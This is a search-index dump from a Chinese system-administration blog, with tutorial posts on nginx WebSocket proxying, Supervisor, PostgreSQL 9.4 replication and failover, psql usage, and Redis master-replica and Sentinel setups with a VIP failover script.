1 timeoutSeconds: 30 --- apiVersion: networking.k8s.io/v1beta1 kind: Ingress metadata: name: gateway namespace: {nameSpace} annotations: kubernetes.io/ingress.class: \"nginx\" nginx.ingress.kubernetes.io/use-regex: \"true\" spec: rules: - host: {domainName} http: paths: - backend: serviceName: gateway servicePort: gateway ","date":"2020-07-06 16:00","objectID":"/post/1871/:0:0","tags":["k8s"],"title":"yaml模板","uri":"/post/1871/"},{"categories":["系统服务"],"content":"要将客户机和服务器之间的连接从HTTP/1.1转换为WebSocket，需要使用HTTP/1.1中提供的协议交换机制。 但是有一个微妙之处：由于“Upgrade”是一个逐跳的报头，它不会从客户端传递到代理服务器。通过正向代理，客户端可以使用CONNECT方法来避免这个问题。但是这不适用于反向代理，因为客户端不知道任何代理服务器，并且需要在代理服务器上进行特殊处理。 从版本1.3.13开始,nginx实现了一种特殊的操作模式，如果代理服务器返回代码为101（交换协议）的响应,并且客户端通过请求中的“Upgrade”报头请求协议交换，则允许在客户端和代理服务器之间建立隧道。 如上所述，包括“Upgrade”和“Connection”在内的逐跳报头不会从客户端传递到代理服务器，因此，为了让被代理服务器知道客户端将协议切换到WebSocket的意图，必须传递这些报头： location /chat/ { proxy_pass http://backend; proxy_http_version 1.1; proxy_set_header Upgrade $http_upgrade; proxy_set_header Connection \"upgrade\"; } 一个更复杂的示例，其中发送到代理服务器的请求中“Connection”请求头的值取决于客户端请求头中是否存在“Upgrade”字段： http { map $http_upgrade $connection_upgrade { default upgrade; '' close; } server { ... location /chat/ { proxy_pass http://backend; proxy_http_version 1.1; proxy_set_header Upgrade $http_upgrade; proxy_set_header Connection $connection_upgrade; } } ","date":"2020-07-03 09:10","objectID":"/post/1866/:0:0","tags":["nginx"],"title":"nginx配置Websocket反向代理","uri":"/post/1866/"},{"categories":["基础内容"],"content":"安装 yum install -y supervisor ","date":"2020-07-02 15:04","objectID":"/post/1865/:1:0","tags":["supervisor"],"title":"Supervisor安装和简单使用","uri":"/post/1865/"},{"categories":["基础内容"],"content":"配置 配置模板 [program:你的应用名称] command=/bin/cat ; 启动命令 process_name=%(program_name)s_%(process_num)02d ; 启动多个副本时，指定不同的进程的名称 numprocs=1 ; 要启动的副本数量 directory=/tmp ; 在指定的目录执行程序 priority=999 ; 启动优先级 (默认: 999) autostart=true ; 自动启动 (默认: true) autorestart=true ; 意外退出时重新启动 (默认: true) startsecs=10 ; 运行10秒后没有异常退出，就代表正常运行 startretries=3 ; 启动失败重新尝试启动的次数 (默认: 3) exitcodes=0,2 ; 进程正常退出的状态码 (默认: 0,2) stopsignal=QUIT ; 终止进程的方式 (默认: TERM) user=chrism ; 用指定的用户启动 redirect_stderr=true ; 将进程的stderr重定向到stdout（默认: false） stdout_logfile=/a/path ; stdout日志路径 stdout_logfile_maxbytes=1MB ; stdout单个日志大小，满足后轮转(默认 50M) stdout_logfile_backups=10 ; stdout日志文件备份数 (默认 10) stderr_logfile=/a/path ; stderr日志路径 stderr_logfile_maxbytes=1MB ; stderr单个日志大小，满足后轮转(默认 50M) stderr_logfile_backups=10 ; stderr日志文件备份数 (默认 10) environment=A=1,B=2 ; 设置环境变量 写一个例子： [program:app] command=/usr/local/python3/bin/python3 app.py directory=/root autostart=true autorestart=true startsecs=10 startretries=3 exitcodes=0,2 stopsignal=QUIT user=root redirect_stderr=true stdout_logfile=/var/log/app.log stdout_logfile_maxbytes=1MB stdout_logfile_backups=10 root目录下放一个app.py import logging logging.basicConfig(format=\"%(asctime)s-%(name)s-%(levelname)s-%(message)s\",level=logging.INFO) log = logging.getLogger('demo') while True: log.error(\"错啦错啦\") log.info('挺好挺好') ","date":"2020-07-02 15:04","objectID":"/post/1865/:2:0","tags":["supervisor"],"title":"Supervisor安装和简单使用","uri":"/post/1865/"},{"categories":["基础内容"],"content":"启动supervisord程序 systemctl start supervisord或者supervisord -c /etc/supervisord.conf ","date":"2020-07-02 15:04","objectID":"/post/1865/:3:0","tags":["supervisor"],"title":"Supervisor安装和简单使用","uri":"/post/1865/"},{"categories":["基础内容"],"content":"常用命令 # 启动应用 supervisorctl start all # 启动所有进程 supervisorctl start app # 启动指定进程 supervisorctl start app:* # 启动一组进程 # 重启应用 supervisorctl restart all # 重启所有进程 supervisorctl restart app # 重启指定进程 supervisorctl restart app:* # 重启一组进程 # 停止应用 supervisorctl stop all # 停止所有进程 supervisorctl stop app # 停止指定进程 supervisorctl stop app:* # 停止一组进程 # 查看被管理项目运行状态 supervisorctl status # 查看所有进程状态 supervisorctl status app:* # 查看一组进程状态 # 重新加载配置文件 supervisorctl update # 重新加载所有配置文件，并重新运行进程 supervisorctl update app # 重新加载指定配置文件，并重新运行进程 # 重新启动所有程序 supervisorctl reload # 重新所有进程 # 清除日志 supervisorctl clear # 清除日志 supervisorctl clear app # 清除指定日志 ","date":"2020-07-02 15:04","objectID":"/post/1865/:3:1","tags":["supervisor"],"title":"Supervisor安装和简单使用","uri":"/post/1865/"},{"categories":["基础内容"],"content":"检查 tail -f /var/log/app.log ","date":"2020-07-02 15:04","objectID":"/post/1865/:4:0","tags":["supervisor"],"title":"Supervisor安装和简单使用","uri":"/post/1865/"},{"categories":["python"],"content":"安装 pip3 install virtualenv virtualenvwrapper 配置 vim ~/.bashrc source /usr/local/python3/bin/virtualenvwrapper.sh VIRTUALENVWRAPPER_PYTHON=/usr/local/python3/bin/python3.6 使用 #创建环境： mkvirtualenv \u003c环境名\u003e #指定py版本 mkvirtualenv -p python2 \u003c环境名\u003e #删除环境： rmvirtualenv \u003c环境名\u003e #切换环境： workon \u003c环境名\u003e #退出环境： deactivate 列出所有环境：workon 或者 lsvirtualenv 默认创建的虚拟环境在~/.virtualenvs/可以使用WORKON_HOME变量修改 ","date":"2020-07-02 11:53","objectID":"/post/1864/:0:0","tags":["python"],"title":"python虚拟环境virtualenv安装使用","uri":"/post/1864/"},{"categories":["databases"],"content":"准备2台pgsql 主服务器安装并初始化，从服务器只安装不用初始化 主机 IP 角色 pgsql01 10.0.0.72 主 pgsql02 10.0.0.73 从 ","date":"2020-06-30 08:59","objectID":"/post/1859/:1:0","tags":["postgresql","pgsql"],"title":"pgsql9.4主备配置","uri":"/post/1859/"},{"categories":["databases"],"content":"主库配置 1.创建同步用户 psql -c \"create user replica CREATEDB SUPERUSER LOGIN REPLICATION password '123456';\" 2.给同步用户添加连接权限 vim /data/pgsql/pg_hba.conf添加如下内容 host all all 10.0.0.0/24 md5 local replication replica trust host replication replica 10.0.0.0/24 md5 host replication replica ::1/128 trust 3.修改主库配置 vim /data/pgsql/postgres.conf # 监听地址 listen_addresses = 'localhost,10.0.0.72' # 从服务器的最大并发连接数（即，同时运行的WAL sender进程的最大数量） max_wal_senders = 3 # 流复制级别决定有多少信息被写入到WAL中，默认只写入服务端崩溃时所需信息。 archive补充WAL归档需要的日志记录； hot_standby进一步增加在从服务器上运行只读查询所需的信息 wal_level = hot_standby # 服务器会在检查点后的第一次修改期间将每个磁盘页的全部内容写入WAL，即使对于所谓的提示位的非关键修改也是如此。 wal_log_hints = on # 指定在pg_xlog目录下的以往日志文件段的最小数量 wal_keep_segments = 10 # 指定恢复期间是否可以连接并运行查询 hot_standby = on 4.重启 pg_ctl -D /data/pgsql restart -l pgsql.log ","date":"2020-06-30 08:59","objectID":"/post/1859/:2:0","tags":["postgresql","pgsql"],"title":"pgsql9.4主备配置","uri":"/post/1859/"},{"categories":["databases"],"content":"从库配置 1.基础备份 pg_basebackup -h10.0.0.72 -Ureplica -Fp -Xs -v -P -D /data/pgsql/ -R 参数说明： -Fp：使用plain(原样输出)格式备份 -Xs：表示备份开始后，启动另一个流复制连接从主库接收WAL日志. -v：输出详细信息 -P：显示进度信息 -D：将基本备份放到哪个目录 -R：在备份结束后自动生成recovery.conf文件 2.修改从库配置 postgres.conf listen_addresses = 'localhost,10.0.0.73' # 指定恢复期间是否可以连接并运行查询 hot_standby = on # 设置多长时间发送一次从库的状态 wal_receiver_status_interval = 10 # 减少从节点执行查询时复制冲突的可能 hot_standby_feedback = on recovery.conf standby_mode = 'on' primary_conninfo = 'user=replica password=123456 host=10.0.0.72 port=5432 sslmode=disable sslcompression=1' recovery_target_timeline = 'latest' trigger_file = '/data/pgsql/trigger_file' 3.设置目录权限 chmod -R 0700 /data/pgsql/ 4.启动服务 pg_ctl -D /data/pgsql -l /data/pgsql/pgsql.log start ","date":"2020-06-30 08:59","objectID":"/post/1859/:3:0","tags":["postgresql","pgsql"],"title":"pgsql9.4主备配置","uri":"/post/1859/"},{"categories":["databases"],"content":"查询同步状态 \\x auto select * from pg_stat_replication; -[ RECORD 1 ]----+------------------------------ pid | 1693 usesysid | 16404 usename | replica application_name | walreceiver client_addr | 10.0.0.73 client_hostname | client_port | 33086 backend_start | 2020-06-29 22:51:27.448759-04 backend_xmin | 1913 state | streaming sent_location | 0/5017268 write_location | 0/5017268 flush_location | 0/5017268 replay_location | 0/5017268 sync_priority | 0 sync_state | async ","date":"2020-06-30 08:59","objectID":"/post/1859/:4:0","tags":["postgresql","pgsql"],"title":"pgsql9.4主备配置","uri":"/post/1859/"},{"categories":["databases"],"content":"测试 登陆主库创建数据： create database test1; \\c test1; create table public.user(id SERIAL primary key, name varchar(32), age int); insert into \"user\" values(1,'soulchild',18); 登陆从库查询： \\l \\c test1 \\dt select name from public.user where id=1; name ----------- soulchild (1 row) ","date":"2020-06-30 08:59","objectID":"/post/1859/:5:0","tags":["postgresql","pgsql"],"title":"pgsql9.4主备配置","uri":"/post/1859/"},{"categories":["databases"],"content":"模拟服务器故障 停止主服务器 pg_ctl stop -D /data/pgsql/ 从库仍然可查询，但不能写 创建trigger文件,提升从服务器为主： touch /data/pgsql/trigger_file 现在从服务器就可以读写了。 在从服务器插入数据 \\c test insert into public.\"user\" values(2,'xiaolan',12); 启动10.0.0.72这台服务器并设置为从服务器 vim /data/pgsql/recovery.conf standby_mode = 'on' primary_conninfo = 'user=replica password=123456 host=10.0.0.73 port=5432 sslmode=disable sslcompression=1' recovery_target_timeline = 'latest' trigger_file = '/data/pgsql/trigger_file' 启动新的从服务器 pg_ctl -D /data/pgsql/ -l /data/pgsql/pgsql.log start 查询是否和新的主服务器同步了数据 \\c test select * from public.user; ","date":"2020-06-30 08:59","objectID":"/post/1859/:6:0","tags":["postgresql","pgsql"],"title":"pgsql9.4主备配置","uri":"/post/1859/"},{"categories":["databases"],"content":"1.连接数据库 psql -Upostgres -h localhost -p 5432 -d postgres 2.命令行执行sql psql -c '\\l' psql -c 'select current_time' psql -f my.sql 3.psql命令 \\du：查看用户列表 \\x: 开启扩展显示，再次输入关闭。类似mysql\\G \\g：将执行结果发送到文件或管道 select current_time;\\g a.txt gset：将执行结果发送到psql变量 select current_time;\\gset my_time \\watch：每秒执行查询 \\watch select current_time; \\timing：显示sql执行时间 \\timing off or \\timing on \\set：设置变量 \\set AUTOCOMMIT off： 关闭自动提交事物 \\set a 1可以使用:a来调用 \\dt+：列出所有表，也可以指定规则来查询 \\dt+ pg_*：列出pg_开头的表 \\d+：查看所有表的字段信息 \\d+ test：查看test表的字段信息 \\l：查看所有数据库 \\c：切换数据库 \\di：查看索引 \\ds：查看序列 \\dns：查看schema \\copy：将表的数据写到文件，或者从文件读取数据写到表中 \\copy test to ./test.txt：将test表所有数据写到文件中 \\copy (select id from test) to ./test_id.txt：将query语句查询的内容写到文件 4.常用sql 创建数据库： create database test; 创建schema： create schema test_schema; 创建表： create table test_schema.test1(id int,name varchar(64), unique(id)); 设置默认查询路径： set search_path to test_schema; 创建序列： create sequence test_seq; 创建用户： create user \u003cusername\u003e with \u003c权限 CREATEDB LOGIN\u003e password '\u003cpassword\u003e'; 修改用户密码： alter user \u003cusername\u003e with password '\u003cpassword\u003e'; 删除用户： drop user \u003cusername\u003e; 查询用户： select * from pg_user; select * from pg_authid; select * from pg_roles; ","date":"2020-06-29 11:22","objectID":"/post/1853/:0:0","tags":["postgresql","pgsql"],"title":"psql基本命令和常用sql","uri":"/post/1853/"},{"categories":["databases"],"content":"安装： yum install -y gcc readline-devel zlib-devel wget http://ftp.postgresql.org/pub/source/v9.4.25/postgresql-9.4.25.tar.gz tar xf postgresql-9.4.25.tar.gz cd postgresql-9.4.25/ ./configure --prefix=/usr/local/pgsql make make install mkdir /data/pgsql -p useradd postgres chown -R postgres:postgres /usr/local/pgsql /data/pgsql su postgres /usr/local/pgsql/bin/initdb -D /data/pgsql/ /usr/local/pgsql/bin/pg_ctl -D /data/pgsql/ -l /usr/local/pgsql/pgsql.log start 配置环境变量方便使用 vim /etc/profile export PGSQL_HOME=/usr/local/pgsql export PATH=$PATH:$PGSQL_HOME/bin #使配置生效 source /etc/profile systemd启动 [Unit] Description=PostgreSQL 9.4 database server Documentation=https://www.postgresql.org/docs/9.4/static/ After=syslog.target After=network.target [Service] Type=forking User=postgres Group=postgres # Note: avoid inserting whitespace in these Environment= lines, or you may # break postgresql-setup. # Location of database directory Environment=PGDATA=/data/postgresql/ # Where to send early-startup messages from the server (before the logging # options of postgresql.conf take effect) # This is normally controlled by the global default set by systemd # StandardOutput=syslog # Disable OOM kill on the postmaster OOMScoreAdjust=-1000 ExecStart=/application/pgsql/bin/pg_ctl start -D ${PGDATA} -s -w -t 300 ExecStop=/application/pgsql/bin/pg_ctl stop -D ${PGDATA} -s -m fast ExecReload=/application/pgsql/bin/pg_ctl reload -D ${PGDATA} -s # Do not set any timeout value, so that systemd will not kill postmaster # during crash recovery. TimeoutSec=0 [Install] WantedBy=multi-user.target ","date":"2020-06-29 10:33","objectID":"/post/1852/:0:0","tags":["postgresql","pgsql"],"title":"pgsql9.4.25源码安装","uri":"/post/1852/"},{"categories":["python","databases"],"content":" # -*- coding: utf-8 -*- import redis from redis.sentinel import Sentinel # 连接哨兵服务器(主机名也可以用域名) sentinel = Sentinel([('10.0.0.30', 26379), ('10.0.0.30', 26379), ('10.0.0.30', 26379), ], socket_timeout=0.5) # 获取主服务器地址 master = sentinel.discover_master('mymaster') print('主服务器地址:', master) # 获取从服务器地址 slave = sentinel.discover_slaves('mymaster') print('从服务器地址:', slave) # 获取主服务器连接实例 master = sentinel.master_for('mymaster', socket_timeout=0.5, db=15) print('主服务器连接实例：', master) # 获取从服务器进行读取（默认是round-roubin） slave = sentinel.slave_for('mymaster', socket_timeout=0.5, db=15) def test(i): input(\"任意键继续...\") w_ret = master.set('foo', i) print('set结果:', w_ret) r_ret = slave.get('foo') print('get结果:',r_ret.decode()) for i in range(1,100): test(i) ","date":"2020-06-28 16:38","objectID":"/post/1850/:0:0","tags":["redis","python"],"title":"python操作redis-sentinel","uri":"/post/1850/"},{"categories":["databases"],"content":"三个哨兵配置如下 port 26379 daemonize yes pidfile \"/var/run/redis-sentinel.pid\" logfile \"/var/log/redis/redis-sentinel.log\" sentinel monitor mymaster 10.0.0.30 6379 2 sentinel down-after-milliseconds mymaster 5000 sentinel failover-timeout mymaster 20000 sentinel parallel-syncs mymaster 1 sentinel client-reconfig-script mymaster /server/scripts/redis_sentinel.sh ","date":"2020-06-28 13:17","objectID":"/post/1849/:1:0","tags":["redis"],"title":"redis哨兵模式vip","uri":"/post/1849/"},{"categories":["databases"],"content":"IP漂移脚本 每个sentinel节点都需要添加 vim /server/scripts/redis_sentinel.sh #!/bin/bash MASTER_IP=${6} VIP='10.0.0.25' NETMASK='24' INTERFACE='eth0' MY_IP=`ip a s dev ${INTERFACE} | awk 'NR==3{split($2,ip,\"/\");print ip[1]}'` if [ ${MASTER_IP} = ${MY_IP} ]; then /sbin/ip addr add ${VIP}/${NETMASK} dev ${INTERFACE} /sbin/arping -q -c 3 -A ${VIP} -I ${INTERFACE} exit 0 else /sbin/ip addr del ${VIP}/${NETMASK} dev ${INTERFACE} exit 0 fi exit 1 redis-sentinel会向脚本传参mymaster observer start 旧主ip 6379 新主ip 6379 添加执行权限 chmod +x /server/scripts/redis_sentinel.sh ","date":"2020-06-28 13:17","objectID":"/post/1849/:2:0","tags":["redis"],"title":"redis哨兵模式vip","uri":"/post/1849/"},{"categories":["databases"],"content":"手动添加VIP 主节点执行： ip addr add 10.0.0.25/24 dev eth0 ","date":"2020-06-28 13:17","objectID":"/post/1849/:3:0","tags":["redis"],"title":"redis哨兵模式vip","uri":"/post/1849/"},{"categories":["databases"],"content":"测试 停止主节点 redis-cli shutdown 查看哨兵日志,主节点已经切到10.0.0.31了 tail /var/log/redis/redis-sentinel.log 3723:X 28 Jun 2020 03:51:28.289 # +switch-master mymaster 10.0.0.30 6379 10.0.0.31 6379 3723:X 28 Jun 2020 03:51:28.290 * +slave slave 10.0.0.32:6379 10.0.0.32 6379 @ mymaster 10.0.0.31 6379 3723:X 28 Jun 2020 03:51:28.290 * +slave slave 10.0.0.30:6379 10.0.0.30 6379 @ mymaster 10.0.0.31 6379 3723:X 28 Jun 2020 03:51:33.297 # +sdown slave 10.0.0.30:6379 10.0.0.30 6379 @ mymaster 10.0.0.31 6379 检查旧主节点vip是否删除 检查新主节点vip是否添加 ip a ","date":"2020-06-28 13:17","objectID":"/post/1849/:4:0","tags":["redis"],"title":"redis哨兵模式vip","uri":"/post/1849/"},{"categories":["系统服务"],"content":"1.安装redis yum install -y gcc-c++ cd /server/packages wget http://download.redis.io/releases/redis-5.0.5.tar.gz tar xf redis-5.0.5.tar.gz cd redis-5.0.5 make make install ","date":"2020-06-28 12:03","objectID":"/post/2425/:0:1","tags":["redis"],"title":"redis哨兵模式+vip配置","uri":"/post/2425/"},{"categories":["系统服务"],"content":"2.整合redis mkdir /usr/local/redis/{etc,bin,log} -p cp redis.conf sentinel.conf /usr/local/redis/etc/ cd src cp mkreleasehdr.sh redis-benchmark redis-check-aof redis-check-rdb redis-cli redis-sentinel redis-server redis-trib.rb /usr/local/redis/bin/ 整合后可以复用，分发到其他节点 ","date":"2020-06-28 12:03","objectID":"/post/2425/:0:2","tags":["redis"],"title":"redis哨兵模式+vip配置","uri":"/post/2425/"},{"categories":["系统服务"],"content":"3.配置环境变量 echo 'export PATH=$PATH:/usr/local/redis/bin' \u003e\u003e /etc/profile source /etc/profile ","date":"2020-06-28 12:03","objectID":"/post/2425/:0:3","tags":["redis"],"title":"redis哨兵模式+vip配置","uri":"/post/2425/"},{"categories":["系统服务"],"content":"4.调优 echo -e 'vm.overcommit_memory=1\\nnet.core.somaxconn=2048' \u003e\u003e /etc/sysctl.conf # 重新加载配置 sysctl -p ","date":"2020-06-28 12:03","objectID":"/post/2425/:0:4","tags":["redis"],"title":"redis哨兵模式+vip配置","uri":"/post/2425/"},{"categories":["系统服务"],"content":"5.修改配置文件 vim /usr/local/redis/etc/redis.conf bind 0.0.0.0 protected-mode yes port 6379 tcp-backlog 2048 timeout 0 tcp-keepalive 300 daemonize yes supervised systemd pidfile \"/var/run/redis_6379.pid\" loglevel notice logfile \"/usr/local/redis/log/access.log\" databases 16 always-show-logo yes save 900 1 save 300 10 save 60 10000 stop-writes-on-bgsave-error yes rdbcompression yes rdbchecksum yes dbfilename \"dump.rdb\" dir \"/usr/local/redis\" replica-serve-stale-data yes replica-read-only yes repl-diskless-sync no repl-diskless-sync-delay 5 repl-disable-tcp-nodelay no replica-priority 100 lazyfree-lazy-eviction no lazyfree-lazy-expire no lazyfree-lazy-server-del no replica-lazy-flush no appendonly no appendfilename \"appendonly.aof\" appendfsync everysec no-appendfsync-on-rewrite no auto-aof-rewrite-percentage 100 auto-aof-rewrite-min-size 64mb aof-load-truncated yes aof-use-rdb-preamble yes lua-time-limit 5000 slowlog-log-slower-than 10000 slowlog-max-len 128 latency-monitor-threshold 0 notify-keyspace-events \"\" hash-max-ziplist-entries 512 hash-max-ziplist-value 64 list-max-ziplist-size -2 list-compress-depth 0 set-max-intset-entries 512 zset-max-ziplist-entries 128 zset-max-ziplist-value 64 hll-sparse-max-bytes 3000 stream-node-max-bytes 4096 stream-node-max-entries 100 activerehashing yes client-output-buffer-limit normal 0 0 0 client-output-buffer-limit replica 256mb 64mb 60 client-output-buffer-limit pubsub 32mb 8mb 60 hz 10 dynamic-hz yes aof-rewrite-incremental-fsync yes rdb-save-incremental-fsync yes maxclients 4064 如果是从节点，需要指向主节点，添加类似如下配置项 slaveof 172.17.10.161 6379 ","date":"2020-06-28 12:03","objectID":"/post/2425/:0:5","tags":["redis"],"title":"redis哨兵模式+vip配置","uri":"/post/2425/"},{"categories":["系统服务"],"content":"6.配置sentinel vim /usr/local/redis/etc/sentinel.conf daemonize yes port 26379 logfile /var/log/redis/redis-sentinel.log pidfile /var/run/redis-sentinel.pid sentinel monitor elk 172.17.10.161 6379 2 sentinel down-after-milliseconds elk 3000 sentinel failover-timeout elk 20000 sentinel parallel-syncs elk 1 sentinel client-reconfig-script elk /server/scripts/redis_sentinel.sh 三个节点同样的配置 ","date":"2020-06-28 12:03","objectID":"/post/2425/:0:6","tags":["redis"],"title":"redis哨兵模式+vip配置","uri":"/post/2425/"},{"categories":["系统服务"],"content":"7.创建启动用户 useradd -r redis \u0026\u0026 chown -R redis.redis /usr/local/redis/ ","date":"2020-06-28 12:03","objectID":"/post/2425/:0:7","tags":["redis"],"title":"redis哨兵模式+vip配置","uri":"/post/2425/"},{"categories":["系统服务"],"content":"8.配置systemd脚本 redis-server vim /etc/systemd/system/redis.service [Unit] Description=Redis persistent key-value database After=network.target After=network-online.target Wants=network-online.target [Service] ExecStart=/usr/local/redis/bin/redis-server /usr/local/redis/etc/redis.conf --supervised systemd Type=notify User=redis Group=redis [Install] WantedBy=multi-user.target redis-sentinel vim /etc/systemd/system/redis-sentinel.service [Unit] Description=Redis Sentinel After=network.target After=network-online.target Wants=network-online.target [Service] ExecStart=/usr/local/redis/bin/redis-sentinel /usr/local/redis/etc/sentinel.conf --supervised systemd Type=notify #User=redis #Group=redis [Install] WantedBy=multi-user.target ","date":"2020-06-28 12:03","objectID":"/post/2425/:0:8","tags":["redis"],"title":"redis哨兵模式+vip配置","uri":"/post/2425/"},{"categories":["系统服务"],"content":"9.配置VIP漂移脚本 每个sentinel节点都需要添加如下脚本 vim /server/scripts/redis_sentinel.sh #!/bin/bash MASTER_IP=${6} VIP='172.17.10.164' NETMASK='24' INTERFACE='eth0' MY_IP=`ip a s dev ${INTERFACE} | awk 'NR==3{split($2,ip,\"/\");print ip[1]}'` if [ ${MASTER_IP} = ${MY_IP} ]; then /sbin/ip addr add ${VIP}/${NETMASK} dev ${INTERFACE} /sbin/arping -q -c 3 -A ${VIP} -I ${INTERFACE} exit 0 else /sbin/ip addr del ${VIP}/${NETMASK} dev ${INTERFACE} exit 0 fi exit 1 ","date":"2020-06-28 12:03","objectID":"/post/2425/:0:9","tags":["redis"],"title":"redis哨兵模式+vip配置","uri":"/post/2425/"},{"categories":["系统服务"],"content":"10.启动服务 systemctl start redis systemctl enable redis systemctl start redis-sentinel systemctl enable redis-sentinel ","date":"2020-06-28 12:03","objectID":"/post/2425/:0:10","tags":["redis"],"title":"redis哨兵模式+vip配置","uri":"/post/2425/"},{"categories":["databases"],"content":"Redis 的 Sentinel 系统用于管理多个 Redis 服务器（instance）， 该系统执行以下三个任务： 监控（Monitoring）： Sentinel 会不断地检查你的主服务器和从服务器是否运作正常。 提醒（Notification）： 当被监控的某个 Redis 服务器出现问题时， Sentinel 可以通过 API 向管理员或者其他应用程序发送通知。 自动故障迁移（Automatic failover）： 当一个主服务器不能正常工作时， Sentinel 会开始一次自动故障迁移操作， 它会将失效主服务器的其中一个从服务器升级为新的主服务器， 并让失效主服务器的其他从服务器改为复制新的主服务器； 当客户端试图连接失效的主服务器时， 集群也会向客户端返回新主服务器的地址， 使得集群可以使用新主服务器代替失效服务器。 ","date":"2020-06-24 17:07","objectID":"/post/1847/:0:0","tags":["redis"],"title":"redis哨兵模式配置","uri":"/post/1847/"},{"categories":["databases"],"content":"环境准备： redis-server： 10.0.0.30:6379 主 10.0.0.30:6389 从 10.0.0.31:6379 从 10.0.0.31:6380 从 redis-sentinel： 10.0.0.30:26379 10.0.0.30:26380 10.0.0.31:26379 ","date":"2020-06-24 17:07","objectID":"/post/1847/:1:0","tags":["redis"],"title":"redis哨兵模式配置","uri":"/post/1847/"},{"categories":["databases"],"content":"配置redis主从 参考链接 ","date":"2020-06-24 17:07","objectID":"/post/1847/:2:0","tags":["redis"],"title":"redis哨兵模式配置","uri":"/post/1847/"},{"categories":["databases"],"content":"配置sentinel sentinel配置文件: daemonize yes port 26379 logfile /var/log/redis/redis-sentinel.log pidfile /var/run/redis-sentinel.pid sentinel monitor mymaster 10.0.0.30 6379 2 sentinel down-after-milliseconds mymaster 5000 sentinel failover-timeout mymaster 20000 sentinel parallel-syncs mymaster 1 ","date":"2020-06-24 17:07","objectID":"/post/1847/:3:0","tags":["redis"],"title":"redis哨兵模式配置","uri":"/post/1847/"},{"categories":["databases"],"content":"配置说明： sentinel monitor mymaster 10.0.0.30 6379 2: 配置Sentinel去监视一个名为mymaster的主服务器， 这个主redis的IP地址为10.0.0.30，端口号为 6379，而将这个主redis判断为失效至少需要2个Sentinel同意（只要同意Sentinel的数量不达标，自动故障迁移就不会执行）。 不过要注意， 无论你设置要多少个Sentinel同意才能判断一个服务器失效，Sentinel 都需要获得系统中多数Sentinel的支持，才能发起一次自动故障迁移 sentinel down-after-milliseconds mymaster 5000: 指定了Sentinel认为服务器已经断线所需的毫秒数。 如果服务器在给定的毫秒数之内， 没有返回Sentinel发送的PING命令的回复，或者返回一个错误，那么 Sentinel将这个服务器标记为主观下线(subjectively down,简称SDOWN)。 不过只有一个Sentinel将服务器标记为主观下线并不一定会引起服务器的自动故障迁移：只有在足够数量的Sentinel都将一个服务器标记为主观下线之后，服务器才会被标记为客观下线（objectively down， 简称ODOWN），这时自动故障迁移才会执行。 sentinel failover-timeout mymaster 15000: 故障迁移的超时时间 sentinel parallel-syncs mymaster 1：选项指定了在执行故障转移时， 最多可以有多少个从服务器同时对新的主服务器进行同步， 这个数字越小， 完成故障转移所需的时间就越长。 如果从服务器被设置为允许使用过期数据集（参见对 redis.conf 文件中对 slave-serve-stale-data 选项的说明）， 那么你可能不希望所有从服务器都在同一时间向新的主服务器发送同步请求， 因为尽管复制过程的绝大部分步骤都不会阻塞从服务器， 但从服务器在载入主服务器发来的 RDB 文件时， 仍然会造成从服务器在一段时间内不能处理命令请求： 如果全部从服务器一起对新的主服务器进行同步， 那么就可能会造成所有从服务器在短时间内全部不可用的情况出现。 你可以通过将这个值设为 1 来保证每次只有一个从服务器处于不能处理命令请求的状态。 ","date":"2020-06-24 17:07","objectID":"/post/1847/:3:1","tags":["redis"],"title":"redis哨兵模式配置","uri":"/post/1847/"},{"categories":["databases"],"content":"启动哨兵 其他节点修改配置后，相同方式启动 redis-sentinel sentinel.conf ","date":"2020-06-24 17:07","objectID":"/post/1847/:4:0","tags":["redis"],"title":"redis哨兵模式配置","uri":"/post/1847/"},{"categories":["databases"],"content":"模拟故障 # 关闭主节点 redis-cli shutdown # 连接其他节点，查看 [root@redis02 ~]# redis-cli 127.0.0.1:6379\u003e info Replication # Replication role:slave master_host:10.0.0.31 master_port:6380 master_link_status:up 主节点已经切换到10.0.0.31:6380这台机器上了 #查看哨兵集群状态 # 连接哨兵服务端口 redis-cli -p 26379 127.0.0.1:26379\u003e info Sentinel # Sentinel sentinel_masters:1 sentinel_tilt:0 sentinel_running_scripts:0 sentinel_scripts_queue_length:0 sentinel_simulate_failure_flags:0 master0:name=mymaster,status=ok,address=10.0.0.31:6380,slaves=3,sentinels=4 ","date":"2020-06-24 17:07","objectID":"/post/1847/:5:0","tags":["redis"],"title":"redis哨兵模式配置","uri":"/post/1847/"},{"categories":["databases"],"content":"###1.安装redis 参考链接 ###2.配置redis master: port 6379 daemonize yes bind 0.0.0.0 pidfile /var/run/redis_6379-master.pid logfile \"/var/log/redis/redis_6379-master.log\" slave: port 6379 daemonize yes bind 0.0.0.0 pidfile /var/run/redis_6379-slave.pid logfile \"/var/log/redis/redis_6379-slave.log\" # 指定redis-master的地址和端口 slaveof 10.0.0.30 6379 ###3.启动两台redis redis-server redis.conf ###4.测试 登陆主redis [root@redis01 etc]# redis-cli 127.0.0.1:6379\u003e set name soulchild OK 登陆从redis [root@redis02 ~]# redis-cli 127.0.0.1:6379\u003e keys * 1) \"name\" 127.0.0.1:6379\u003e get name \"soulchild\" 如果在主从复制架构中出现宕机的情况，需要分情况看： 1）从Redis宕机 这个相对而言比较简单，在Redis中从库重新启动后会自动加入到主从架构中，自动完成同步数据，这是因为在Redis2.8版本后就新增了增量复制功能，主从断线后恢复是通过增量复制实现的。所以这种情况无需担心。 2）主Redis宕机 这个情况相对而言就会复杂一些，需要以下2步才能完成： 第一步，在从数据库中执行SLAVEOF NO ONE命令，断开主从关系并且提升为主库继续服务； 第二步，将主库修复重新启动后，执行SLAVEOF host port命令，将其设置为其他库的从库，这时数据就能更新回来； 这两个步骤要通过手动完成恢复，过程其实是比较麻烦的并且容易出错，有没有好办法解决呢？有的，Redis提供的哨兵（sentinel）功能就可以实现主Redis宕机的自动切换。这个将在后面重点介绍。 ###5.redis主从配置优化 slaveof \u003cmasterip\u003e \u003cmasterport\u003e 复制选项，slave复制对应的master的ip和端口。 masterauth \u003cmaster-password\u003e 如果master设置了requirepass，那么slave要连上master，需要有master的密码才行。masterauth就是用来配置master的密码，这样可以在连上master后进行认证。 slave-serve-stale-data yes 当从库同主库失去连接或者复制正在进行，从库有两种运行方式，决定如何处理后续的请求： 如果slave-serve-stale-data设置为yes(默认设置)，从库会继续响应客户端的请求。 如果slave-serve-stale-data设置为no，除去INFO和SLAVOF命令之外的任何请求都会返回一个错误”SYNC with master in progress”。 slave-read-only yes 作为从服务器，默认情况下是只读的（yes），可以修改成NO，用于写（不建议）。 repl-diskless-sync no 